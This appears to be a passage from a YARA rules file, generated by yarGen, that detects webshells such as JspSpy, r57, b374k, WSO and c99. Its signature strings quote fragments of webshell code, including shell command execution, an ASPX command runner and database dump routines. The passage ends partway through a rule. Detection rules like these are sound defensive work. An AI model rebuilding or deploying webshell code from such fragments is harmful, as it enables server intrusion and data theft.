rule _c5_m_he1p_1_nogfw_JspSpy1_403_luci_jsp_spy2009_queryDong_myxx1_a_config_JspSpyJDK5_JspSpyJDK51_u_000_t00ls1_css_807_jspspy__207 {
   meta:
      description = "webshell - from files c5.jsp, m.jsp, he1p.jsp, 1.jsp, nogfw.jsp, JspSpy1.jsp, 403.jsp, luci.jsp.spy2009.jsp, queryDong.jsp, myxx1.jsp, a.jsp, config.jsp, JspSpyJDK5.jsp, JspSpyJDK51.jsp, u.jsp, 000.jsp, t00ls1.jsp, css.jsp, 807.jsp, jspspy_k8.jsp, jspspy.jsp, zend.jsp, t00ls.jsp, ma3.jsp, spyjsp2010.jsp, ok.jsp, style.jsp, SJavaWebManageV1.4.jsp, cofigrue.jsp, dm.jsp, xia.jsp, x7.jsp, mmym520.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "64fbd3a67c6d02626cf130946a3bc5e8113a65ea66176006582a380b12d495d9"
      hash2 = "57764b5504b584b7cd7969b17d2401a6fe85f1f3a03d02943bc0bdc74514a7c3"
      hash3 = "4aa34b6d453b0f2f723d699553533b70accad316d69308987de458664ed8dd79"
      hash4 = "11394a4bf56a01a0c77f3657abc4c90d134fb8579965aa3acb889cf43fb047c1"
      hash5 = "89a1dccb42fea5cb434392324f8729127399f344fba831e60f004a063b05c265"
      hash6 = "bf5e7cbcb5e1651762302f279b749281d834834cce2d5a5af7319e794690ac2e"
      hash7 = "9e510dffd01cef28047043c0331f408279042cf724c8d2a76968e5eb40446caa"
      hash8 = "148f88c0b115cf2e7d5a362863feef97b5c513c1f0925780009489ce5245e1f9"
      hash9 = "9b3677edc3dc6cf868b8c62166ed9db5062891501b3776876ea95a7e8884db72"
      hash10 = "a5b67b8b8617fd8f2cff76399aa8782813bb29f06c9b6b444db8617a65a0771c"
      hash11 = "4ab552f0503e859e7c96850908ca05525f2ea55f6e9058f7750b36f246b7170d"
      hash12 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash13 = "3b4283db4961a557b02b3de8377b61f5c085552a46191625db42939056129d53"
      hash14 = "8047492f47b2ad546190ad1dd18984916da0ac0b046dca46e1f5af315781d182"
      hash15 = "a063d05eac21c1a6eb046c90f770b5f769890034b9daf7dfda58fc749c330b2b"
      hash16 = "2424ea073fb98b85c26b9fd47bc8cfe5008504fd7ab80de428b75c296f3dd114"
      hash17 = "9347f147b944e67d33818aa1a5fa10476ef333acb838e80fffb2db2da71c9368"
      hash18 = "7aa89ae3f2118e6c5eeefab268f4dca602b082edb3c571bdc38b2bc8301a438a"
      hash19 = "b996b499c5f56b51eccc5fa181bc69b208da8023c441277a522aa52ace72ecbd"
      hash20 = "9ce81cfc056822ec9962aa8d6ca2233ac56e26a10f96cddc117d89b73a14c060"
      hash21 = "09662e5f79e84781ecb6b508794e52a578726229cc2e37be676cfba5e8751d1a"
      hash22 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
      hash23 = "bb809d10d8dc0be89123e35d659513fb49faed3aea32c1facfcc9d21ad39f422"
      hash24 = "bb337a76a63131dc29572bd11d2d3104824d08dc06acfbd8cf6059824d1aa104"
      hash25 = "410bf542ec9d693517486e33e7f45955d2a06f77f195e847c74ac3dcacf6a677"
      hash26 = "debf6d0c7f01efd7bdc4322591bf5d0fdbcc299a2093827ac05873276230d336"
      hash27 = "781a141485d7dbf902a5ff10c873653e52622373048e38916a2d7bf5af216074"
      hash28 = "ecf43efae44a4fb4078bc7da76e07cc10fe4e92fc145b58d7999f0cc2b902cde"
      hash29 = "444cb5e82638a872b85d18ecb67b71649f2a3f543bc2874397fa63d889571ce0"
      hash30 = "75c94d0f6f29908dc10227de1eb45de9afa871891c18942ebd33dd916203b43e"
      hash31 = "d77fd709d2bf2a8b25277ebebda1a3522a563eb3a95a240cf2640ab9e7deed58"
      hash32 = "30e33036efcafcca023954308dfb75b7b3a48c4b9d3cdf776943f6479f559235"
      hash33 = "1cd6b614fd667f72bf9b6676522b3e6fac7056c4232f1dcaefff55e98655b1bf"
   strings:
      $s1 = "if (stmt.execute(sql)) {" fullword ascii
      $s2 = "public Object execute(String sql) throws Exception {" fullword ascii
      $s3 = "private Connection conn = null;" fullword ascii
      $s4 = "return conn != null && !conn.isClosed();" fullword ascii
      $s5 = "this.uid = uid;" fullword ascii
      $s6 = "this.pwd = pwd;" fullword ascii
      $s7 = "this.url = url;" fullword ascii
      $s8 = "this.driver = driver;" fullword ascii
      $s9 = "return stmt.getResultSet();" fullword ascii
      $s10 = "private String url;" fullword ascii
      $s11 = "private String driver;" fullword ascii
      $s12 = "public void close() throws Exception {" fullword ascii
      $s13 = "private Statement stmt = null;" fullword ascii
      $s14 = "private String uid;" fullword ascii
      $s15 = "public boolean isValid() throws Exception {" fullword ascii
      $s16 = "public static String formatDate(long time) {" fullword ascii
      $s17 = "private String pwd;" fullword ascii
      $s18 = "throw new Exception(\"Connection is inValid.\");" fullword ascii
      $s19 = "Class.forName(driver);" fullword ascii
      $s20 = "closeStmt();" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0xbbef ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _NEW_WebShell__1__2014_UnKnown_Vip__1__UnKnown_Vip_NEW_WebShell__1___2014_10_23_14_54_16___208 {
   meta:
      description = "webshell - from files NEW WebShell (1).asp, 2014.asp, UnKnown Vip (1).asp, UnKnown Vip.asp, NEW WebShell (1)__2014-10-23-14-54-16.asp, .asp, 2013.asp, .asp, NEW WebShell.asp,  (1).asp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "1cc6359207f91e48f9834698e71893682668f7d9d47cfabbfb2c8a8bbd1e29e0"
      hash2 = "028bc60e3c833563e1b96911bd9357d0015c765524fbbfca29afe33257dd48e7"
      hash3 = "c7530b4c6126a53e2036f0f0f1d05cebc960909a0471e01569ff6fd735572b29"
      hash4 = "57ccf2912b792e21f63ecb9c4308a4276a3291c7f5fdf1e74063bcc9e250316e"
      hash5 = "2e0c6dff1b01fd4a729201ee20cfb3e3db95aba65427afaf168efda3673f3750"
      hash6 = "1be24d938840d2778c29c4394a869b7ff8b11e57b5fd6340ca5fd2488b42a5fc"
      hash7 = "8d7e8a0c10ac15a65f119551a616520dd7be2c35a7fdc51000c66f63abc92fee"
      hash8 = "61cd9e83ae25b8cee03369fe32a4a82ad54829e9d89b8db5267fb1d87d209da6"
      hash9 = "7080a9113a1bfccb5edc725746f0ed8cf44e09b67a78bcfc6ed2413f696e528e"
      hash10 = "c4f1ef150f666537d2a6f97f432419c38c63fc3818b1b97ee5dca3ff804e2ff8"
   strings:
      $s1 = "rs(\"fileContent\") = stream.Read()" fullword ascii
      $s2 = "i = i + Instr(Mid(thePath, i + 1), \"\\\")" fullword ascii
      $s3 = "Set conn = Server.CreateObject(\"ADODB.Connection\")" fullword ascii
      $s4 = "Set conn = CreateObject(\"ADODB.Connection\")" fullword ascii
      $s5 = "stream.SaveToFile str & rs(\"thePath\"), 2" fullword ascii
      $s6 = "connStr = \"Provider=Microsoft.Jet.OLEDB.4.0;Data Source=\" & thePath & \";\"" fullword ascii
      $s7 = "stream.Type = 1" fullword ascii
      $s8 = "Set adoCatalog = Server.CreateObject(\"ADOX.Catalog\")" fullword ascii
      $s9 = "If Request(\"theMethod\") = \"fso\" Then" fullword ascii
      $s10 = "Set stream = CreateObject(\"ADODB.Stream\")" fullword ascii
      $s11 = "Set rs = Nothing" fullword ascii
      $s12 = "Set ws = Nothing" fullword ascii
      $s13 = "If InStr(sysFileList, \"$\" & item.Name & \"$\") <= 0 Then" fullword ascii
      $s14 = "If item.IsFolder = True Then" fullword ascii
      $s15 = "Set theFolder = saX.NameSpace(thePath)" fullword ascii
      $s16 = "Set rs = Server.CreateObject(\"ADODB.RecordSet\")" fullword ascii
      $s17 = "createFolder(str & theFolder)" fullword ascii
      $s18 = "theFolder = Left(rs(\"thePath\"), InStrRev(rs(\"thePath\"), \"\\\"))" fullword ascii
      $s19 = "i = Instr(thePath, \"\\\")" fullword ascii
      $s20 = "Set conn = Nothing" fullword ascii
   condition:
      ( ( uint16(0) == 0x253c or uint16(0) == 0x6f3c ) and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_Crystal_r57shell_SnIpEr_SA_Shell_r57_Mohajer22_r57_kartal_r57_r57_iFX_209 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, Crystal.php, r57shell.php, SnIpEr_SA Shell.php, r57_Mohajer22.php, r57_kartal.php, r57.php, r57_iFX.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "8cbde0e322651be9d980fe33ddee4844beabc7ded6fbc270d92a3772cd25f284"
      hash4 = "05f30186c9edbbf906f8971df2470fa1411f8c029ec7109f20f16ed197191644"
      hash5 = "ef74644065925aa8d64913f5f124fe73d8d289d5f019a104bf5f56689f49ba92"
      hash6 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash7 = "5d07fdfee2dc6d81da26f05028f79badd10dec066909932129d398627b2f4e94"
      hash8 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
      hash9 = "6dc417db9e07420a618d44217932ca8baf3541c08d5e68281e1be10af4280e4a"
   strings:
      $s1 = "if( $mode & 0x800 ) $owner[\"execute\"] = ($owner['execute']=='x') ? 's' : 'S';" fullword ascii
      $s2 = "if( $mode & 0x200 ) $world[\"execute\"] = ($world['execute']=='x') ? 't' : 'T';" fullword ascii
      $s3 = "if( $mode & 0x400 ) $group[\"execute\"] = ($group['execute']=='x') ? 's' : 'S';" fullword ascii
      $s4 = "$owner[\"execute\"] = ($mode & 00100) ? 'x' : '-';" fullword ascii
      $s5 = "$s.=sprintf(\"%1s%1s%1s\", $world['read'], $world['write'], $world['execute']);" fullword ascii
      $s6 = "$group[\"execute\"] = ($mode & 00010) ? 'x' : '-';" fullword ascii
      $s7 = "$s.=sprintf(\"%1s%1s%1s\", $group['read'], $group['write'], $group['execute']);" fullword ascii
      $s8 = "$world[\"execute\"] = ($mode & 00001) ? 'x' : '-';" fullword ascii
      $s9 = "$s.=sprintf(\"%1s%1s%1s\", $owner['read'], $owner['write'], $owner['execute']);" fullword ascii
      $s10 = "$world[\"read\"] = ($mode & 00004) ? 'r' : '-';" fullword ascii
      $s11 = "$owner[\"read\"] = ($mode & 00400) ? 'r' : '-';" fullword ascii
      $s12 = "$group[\"read\"] = ($mode & 00040) ? 'r' : '-';" fullword ascii
      $s13 = "$owner[\"write\"] = ($mode & 00200) ? 'w' : '-';" fullword ascii
      $s14 = "if( $mode & 0x1000 ) { $type='p'; }" fullword ascii
      $s15 = "else if( $mode & 0xC000 ) { $type='s'; }" fullword ascii
      $s16 = "else if( $mode & 0x8000 ) { $type='-'; }" fullword ascii
      $s17 = "else if( $mode & 0x2000 ) { $type='c'; }" fullword ascii
      $s18 = "else if( $mode & 0x4000 ) { $type='d'; }" fullword ascii
      $s19 = "function perms($mode)" fullword ascii
      $s20 = "$all = @disk_total_space($dir);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _warn_JFolder_shell1_210 {
   meta:
      description = "webshell - from files warn.jsp, JFolder.jsp, shell1.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "4c392fe2056ff0333b35b75033c79c593135b7f14f70f77a5bb9bc842f24c95e"
      hash2 = "c953f215c5b45546fb790990e62d2c2c92fcc44c12e4bf7d49582f4621c6505c"
      hash3 = "d7a86a83544229f9cd45878e70294537382cd2b99c58443a1aa8582be0ad6a62"
   strings:
      $x1 = "Process p=Runtime.getRuntime().exec(strCommand,null,new File(strDir));" fullword ascii
      $s2 = "System.out.println(strCommand);" fullword ascii
      $s3 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
      $s4 = "<li><a href=\"http://www.topronet.com\" class=\"current\" onClick=\"return expandcontent('menu1', this)\"> <%=strFileManage[lang" ascii
      $s5 = "strCommand[1]=strShell[1];" fullword ascii
      $s6 = "strCommand[0]=strShell[0];" fullword ascii
      $s7 = "String[] strCommand=new String[3];" fullword ascii
      $s8 = "strCommand[2]=strCmd;" fullword ascii
      $s9 = "strShell[0]=\"/bin/sh\";" fullword ascii
      $s10 = "//Properties prop = new Properties(System.getProperties());  " fullword ascii
      $s11 = "strShell[0]=\"cmd\";" fullword ascii
      $s12 = "sb.append(\" <a href=\\\"javascript:doForm('','\"+roots[i]+strSeparator+\"','','','1','');\\\">\");" fullword ascii
      $s13 = "String[] strShell=new String[2];" fullword ascii
      $s14 = "strShell[1]=\"/c\";" fullword ascii
      $s15 = "strDir = request.getRealPath(\".\");" fullword ascii
      $s16 = "strShell[1]=\"-c\";" fullword ascii
      $s17 = "String strPath = strDir + strSeparator + strFile; " fullword ascii
      $s18 = "String strThisFile=\"JFileMan.jsp\";" fullword ascii
      $s19 = "if(path!=null && !path.endsWith(strSeparator)) " fullword ascii
      $s20 = "<%@page errorPage=\"/\"%>" fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 90KB and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _r57shell127_EgY_SpIdEr_ShElL_V2_r57_Mohajer22_r57_211 {
   meta:
      description = "webshell - from files r57shell127.php, EgY_SpIdEr ShElL V2.php, r57_Mohajer22.php, r57.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e88efb3e4c358ce3ad25f7eca3d437cb8c27572772f29e42604c856df864a860"
      hash2 = "32fc83de0860f0f4b33976d33c9899061e7529694f25b8c7b09b2838c111adcc"
      hash3 = "1db0549066f294f814ec14ba4e9f63d88c4460d68477e5895236173df437d2b8"
      hash4 = "fad01921f2ccc7dfba8cc41af6981f08bf40a3fa96e6787d34582e3529d8b3d0"
   strings:
      $s1 = "'eng_text87'=>'Download files from remote ftp-server'," fullword ascii
      $s2 = "'eng_text100'=>'Send file to remote ftp server'," fullword ascii
      $s3 = "'eng_text95'=>'Users list'," fullword ascii
      $s4 = "'eng_butt14'=>'Download'," fullword ascii
      $s5 = "'eng_text86'=>'Download files from server'," fullword ascii
      $s6 = "'eng_text89'=>'File on ftp'," fullword ascii
      $s7 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text103'].\"</div></b></font>\";" fullword ascii
      $s8 = "'eng_text104'=>'Send file to email'," fullword ascii
      $s9 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text40'].\"</div></b></font>\";" fullword ascii
      $s10 = "'eng_text105'=>'To'," fullword ascii
      $s11 = "'eng_text103'=>'Send email'," fullword ascii
      $s12 = "'eng_text107'=>'Subj'," fullword ascii
      $s13 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text83'].\"</div></b></font>\";" fullword ascii
      $s14 = "'eng_text102'=>'Mail'," fullword ascii
      $s15 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text22'].\"</div></b></font>\";" fullword ascii
      $s16 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text100'].\"</div></b></font>\";" fullword ascii
      $s17 = "'eng_text109'=>'Hide'," fullword ascii
      $s18 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text9'].\"</div></b></font>\";" fullword ascii
      $s19 = "echo \"<font face=Verdana size=-2><b><div align=center id='n'>\".$lang[$language.'_text104'].\"</div></b></font>\";" fullword ascii
      $s20 = "'eng_butt15'=>'Send'," fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 900KB and ( 8 of them )
      ) or ( all of them )
}

rule _b374k_2_4_b374k_2_5_source_b374k_2_2_b374k_2_6_source_b374k_2_3_212 {
   meta:
      description = "webshell - from files b374k-2.4.php, b374k-2.5.source.php, b374k-2.2.php, b374k-2.6.source.php, b374k-2.3.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "13102785319ab7591a39c8a8bb40b01bf34e49a7f0a832a1f3dbaabf5f40e9dd"
      hash2 = "2fa1659755f6cf2f5a5db59a7836e77e0a069218557fa552b9230b5e4da56469"
      hash3 = "5479f8cd1375364770df36e5a18262480a8f9d311e8eedb2c2390ecb233852ad"
      hash4 = "c14466232481a3aa9192507127f2ca43898228671e5e87a17ddd05383c758746"
      hash5 = "e6b1fbcc9a2d988ef9e8c36da38f19a802a5886a43736a1466566f97f342f946"
   strings:
      $s1 = "if(isset($_REQUEST['login'])){" fullword ascii
      $s2 = "&nbsp;<a href=\\\"javascript:tukar('chpwd','chpwdform')\\\">" fullword ascii
      $s3 = "&nbsp;<a href=\\\"javascript:tukar('chpwdform','chpwd');\\\">" fullword ascii
      $s4 = "if(isset($_REQUEST['cmd'])) echo \"\";" fullword ascii
      $s5 = "if(is_uploaded_file($_FILES['filepath']['tmp_name'])){" fullword ascii
      $s6 = "if(isset($_REQUEST['cmd'])){" fullword ascii
      $s7 = "if(!$s_user = rp(exe(\"whoami\"))) $s_user = \"\";" fullword ascii
      $s8 = "if(isset($_REQUEST['rename']) && isset($_REQUEST['oldname']) && isset($_REQUEST['newname'])){" fullword ascii
      $s9 = "if(isset($_REQUEST['uploadhd'])){" fullword ascii
      $s10 = "elseif(isset($_REQUEST['uploadurl'])){" fullword ascii
      $s11 = "// strip slashes,trim and urldecode" fullword ascii
      $s12 = "if(isset($_REQUEST['pid'])){" fullword ascii
      $s13 = "// only strip slashes" fullword ascii
      $s14 = "if(isset($_REQUEST['img'])){" fullword ascii
      $s15 = "$s_id = $s_user;" fullword ascii
      $s16 = "if(isset($_REQUEST['evalcode'])){" fullword ascii
      $s17 = "function tukar(l,b){" fullword ascii
      $s18 = "else{ ?>" fullword ascii
      $s19 = "// php eval() function" fullword ascii
      $s20 = "// remove <br />tags" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _wso_4_2_4_wso_4_2_3_wso_4_2_1_wso_4_2_5__v_wso_4_2_2_213 {
   meta:
      description = "webshell - from files wso-4.2.4.php, wso-4.2.3.php, wso-4.2.1.php, wso-4.2.5.php, .v.php, wso-4.2.2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3c2811c345e88c17088339ac93c76ad49d31b337d12d6c76d024b00280cbee3a"
      hash2 = "a71fb3bfb8eb25f3183bd1020896162130981be54db7343760ce752425734cd0"
      hash3 = "85a6482c2e69e364d041a0fb0f26f5bcd767c26170ab3d310b8a70e73bdf85a7"
      hash4 = "b7f166d633c1f9597cfa70328b568993a75eab3ab00fbccd6bcd91165e171cdb"
      hash5 = "3628cc351602552e975ead1af85af7a20e1e06714f5aaada34d050c559ac4c70"
      hash6 = "5be71264030260ca11eeeeb12c0e99851e53a4d73d342c2a02e1f31f95277410"
   strings:
      $s1 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch', 'Frame');" fullword ascii
      $s2 = "echo '<iframe width=\"100%\" height=\"900px\" scrolling=\"no\" src='.$frameSrc.' onload=\"onload=height=contentDocument.body.scr" ascii
      $s3 = "echo '<iframe width=\"100%\" height=\"900px\" scrolling=\"no\" src='.$frameSrc.' onload=\"onload=height=contentDocument.body.scr" ascii
      $s4 = "if ($frameSrc[strlen($frameSrc) - 1] != '/')" fullword ascii
      $s5 = "elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i])&&($dirContent[$i] != \".\"))" fullword ascii
      $s6 = "$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mo" ascii
      $s7 = "$frameSrc = $frameSrc . htmlspecialchars($_POST['p1']);" fullword ascii
      $s8 = "$frameSrc = substr(htmlspecialchars($GLOBALS['cwd']), strlen(htmlspecialchars($_SERVER['DOCUMENT_ROOT'])));" fullword ascii
      $s9 = "rlencode($f['name']).'\\', \\'download\\')\">D</a>':'').'</td></tr>';" fullword ascii
      $s10 = "$oRb = @highlight_file($_POST['p1'],true);" fullword ascii
      $s11 = ".'</td><td><a class=\"tooltip\" data-tooltip=\"Rename\" href=\"#\" onclick=\"g(\\'FilesTools\\',null,\\''.urlencode($f['name'])." ascii
      $s12 = "$frameSrc = '/' . $frameSrc;" fullword ascii
      $s13 = "if ($frameSrc[0] != '/')" fullword ascii
      $s14 = "de'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','Network'=>'Network');" fullword ascii
      $s15 = "ht\"></iframe>';" fullword ascii
      $s16 = "$frameSrc = $frameSrc . '/';" fullword ascii
      $s17 = "ncode($f['name']).'\\', \\'edit\\')\">E</a> <a class=\"tooltip\" data-tooltip=\"Download\" href=\"#\" onclick=\"g(\\'FilesTools" ascii
      $s18 = "{border:1px solid #060a10;}" fullword ascii
      $s19 = "{min-width:100%;max-width:100%;height:400px;}" fullword ascii
      $s20 = "echo str_replace(array('<span ','</span>'), array('<font ','</font>'),$oRb).'</div>';" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 200KB and ( 8 of them )
      ) or ( all of them )
}

rule _1n73ction_itsec_214 {
   meta:
      description = "webshell - from files 1n73ction.php, itsec.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8dde4d18d837508fd3c62b2a4f8bf2ea9ddb4d11177331a28642518ffabfe8ed"
      hash2 = "f7689792bc8b2a012d41d584fdb21a1af778571c3f4419ca5598b17a370283c7"
   strings:
      $s1 = "$file=\"Dump-$dbname-$date.sql.gz\";" fullword ascii
      $s2 = "$dbpass = $_POST['password'];" fullword ascii
      $s3 = "if ($_POST['username'] && $_POST['dbname'] && $_POST['method']){" fullword ascii
      $s4 = "$dbuser = $_POST['username'];" fullword ascii
      $s5 = "$dbserver = $_POST['server'];" fullword ascii
      $s6 = "$method = $_POST['method'];" fullword ascii
      $s7 = "echo $head.'<p align=\"center\">';" fullword ascii
      $s8 = "gzclose($fp);}" fullword ascii
      $s9 = "while ($i = mysql_fetch_array($tables)) {" fullword ascii
      $s10 = "gzwrite($fp, $data);" fullword ascii
      $s11 = "$fp=fopen($file,\"w\");" fullword ascii
      $s12 = "function write($data) {" fullword ascii
      $s13 = "$fp = gzopen($file,\"w\");" fullword ascii
      $s14 = "if ($method=='sql'){" fullword ascii
      $s15 = "    $sql = mysql_query (\"SELECT * FROM \".$i);" fullword ascii
      $s16 = "    echo fread($fp, 65536);" fullword ascii
   condition:
      ( uint16(0) == 0x3f3c and filesize < 1000KB and ( 8 of them )
      ) or ( all of them )
}

rule _cmd_a3_215 {
   meta:
      description = "webshell - from files cmd.aspx, a3.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "181feef51991b162bdff5d49bb7fd368d9ec2b535475b88bc197d70d73eef886"
      hash2 = "75a006628b803b85247966ed7d29e944cf8cb543d60017dbed0814808fd7da6a"
   strings:
      $s1 = "<asp:TextBox id=\"xpath\" runat=\"server\" Width=\"300px\">c:\\windows\\system32\\cmd.exe</asp:TextBox>        " fullword ascii
      $s2 = "  myProcessStartInfo.UseShellExecute = false            " fullword ascii
      $s3 = "  myProcessStartInfo.Arguments=xcmd.text            " fullword ascii
      $s4 = "  Dim myProcessStartInfo As New ProcessStartInfo(xpath.text)            " fullword ascii
      $s5 = "<%@ import Namespace=\"system.IO\" %>" fullword ascii
      $s6 = "  myProcessStartInfo.RedirectStandardOutput = true            " fullword ascii
      $s7 = "  Dim myStreamReader As StreamReader = myProcess.StandardOutput            " fullword ascii
      $s8 = "  myProcess.Close()            " fullword ascii
      $s9 = "  myProcess.Start()            " fullword ascii
      $s10 = "  Dim myProcess As New Process()            " fullword ascii
      $s11 = "  myProcess.StartInfo = myProcessStartInfo            " fullword ascii
      $s12 = "<asp:TextBox id=\"xcmd\" runat=\"server\" Width=\"300px\" Text=\"/c net user\">/c net user</asp:TextBox>        " fullword ascii
      $s13 = "Sub RunCmd(Src As Object, E As EventArgs)            " fullword ascii
      $s14 = "<script runat=\"server\">      " fullword ascii
      $s15 = "<p><asp:Button id=\"Button\" onclick=\"runcmd\" runat=\"server\" Width=\"100px\" Text=\"Run\"></asp:Button>        " fullword ascii
      $s16 = "<%@ Page Language=\"VB\" Debug=\"true\" %>" fullword ascii
      $s17 = "<p><asp:Label id=\"L_p\" runat=\"server\" width=\"80px\">Program</asp:Label>        " fullword ascii
      $s18 = "<p><asp:Label id=\"result\" runat=\"server\"></asp:Label>       " fullword ascii
      $s19 = "<form runat=\"server\">        " fullword ascii
      $s20 = "<p><asp:Label id=\"L_a\" runat=\"server\" width=\"80px\">Arguments</asp:Label>        " fullword ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 4KB and ( 8 of them )
      ) or ( all of them )
}

rule _config_zend_216 {
   meta:
      description = "webshell - from files config.jsp, zend.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "5deda28b47b16d083c40e0fecdf617de7e645a7b06a053a572c6e2702dc8577b"
      hash2 = "e26e617b9e9b77f4578f8737e3463c18210855626b4aca49d465be65f59e97d1"
   strings:
      $s1 = "this.conn = dataSource.getConnection();" fullword ascii
      $s2 = "+ \"DataSource:\"" fullword ascii
      $s3 = "<%@page import=\"javax.sql.DataSource\"%>" fullword ascii
      $s4 = "public DBOperator(DataSource dataSource,String dsStr,boolean connect){" fullword ascii
      $s5 = "this.dataSource = dataSource;" fullword ascii
      $s6 = "if (!Util.isEmpty(dataSource) || (!Util.isEmpty(driver) && !Util.isEmpty(url) && !Util.isEmpty(uid))) {" fullword ascii
      $s7 = "dbo = new DBOperator(dsObj,dataSource,true);" fullword ascii
      $s8 = "dbo = new DBOperator(dsObj,dataSource,false);" fullword ascii
      $s9 = "String dataSource = request.getParameter(\"dataSource\");" fullword ascii
      $s10 = "DataSource dsObj = (DataSource) appContext.getBean(dataSource);" fullword ascii
      $s11 = "private static class DBOperator implements Serializable {" fullword ascii
      $s12 = "WebApplicationContext appContext = WebApplicationContextUtils.getWebApplicationContext(JSession.getServletContext());" fullword ascii
      $s13 = "private DataSource dataSource;" fullword ascii
      $s14 = "this.dsStr = dsStr;" fullword ascii
      $s15 = "private String dsStr;" fullword ascii
      $s16 = "<%@page import=\"org.springframework.web.context.support.WebApplicationContextUtils\"%>" fullword ascii
      $s17 = "<%@page import=\"org.springframework.web.context.WebApplicationContext\"%>" fullword ascii
      $s18 = "if (connect){" fullword ascii
      $s19 = "+ \"  <input class=\\\"input\\\" name=\\\"dataSource\\\" value=\\\"\"+((Ddbo.dsStr==null)?\"\":Ddbo.dsStr)+\"\\\" id=\\\"dataSou" ascii
      $s20 = "+ \"  <input class=\\\"input\\\" name=\\\"dataSource\\\" id=\\\"dataSource\\\" type=\\\"text\\\" style=\\\"width:80px;\\\"  />\"" ascii
   condition:
      ( uint16(0) == 0x253c and filesize < 400KB and ( 8 of them )
      ) or ( all of them )
}

rule _c99_PSych0_c66_c99v2_c99_w4cking_Shell__ci___Biz_was_here_c99_locus7s_c99_217 {
   meta:
      description = "webshell - from files c99_PSych0.php, c66.php, c99v2.php, c99_w4cking.php, Shell [ci] .Biz was here.php, c99_locus7s.php, c99.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "39b8871928d00c7de8d950d25bff4cb19bf9bd35942f7fee6e0f397ff42fbaee"
      hash2 = "5d7709a33879d1060a6cff5bae119de7d5a3c17f65415822fd125af56696778c"
      hash3 = "80ec7831ae888d5603ed28d81225ed8b256c831077bb8feb235e0a1a9b68b748"
      hash4 = "07f9ec716fb199e00a90091ffba4c2ee1a328a093a64e610e51ab9dd6d33357a"
      hash5 = "9309773b9b00bcb9fe6c71a954dd07e330750d8d36bd11826d98e0fd9963fbfa"
      hash6 = "960feb502f913adff6b322bc9815543e5888bbf9058ba0eb46ceb1773ea67668"
      hash7 = "383d771b55bbe5343bab946fd7650fd42de1933c4c8f32449d9a40c898444ef1"
   strings:
      $s1 = "\\\"dump\\\"><input type=\\\"hidden\\\" name=\\\"sql_db\\\" value=\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden" ascii
      $s2 = "\\\"\".htmlspecialchars($sql_db).\"\\\"><input type=\\\"hidden\\\" name=\\\"sql_login\\\" value=\\\"\".htmlspecialchars($sql_log" ascii
      $s3 = "method=\\\"POST\\\"><b>\"; if (($sql_query) and (!$submit)) {echo \"Do you really want to:\";} else {echo \"SQL-Query :\";} echo" ascii
      $s4 = "e=\"<?php echo htmlspecialchars($sql_login); ?>\"><input type=\"hidden\" name=\"sql_passwd\" value=\"<?php echo htmlspecialchars" ascii
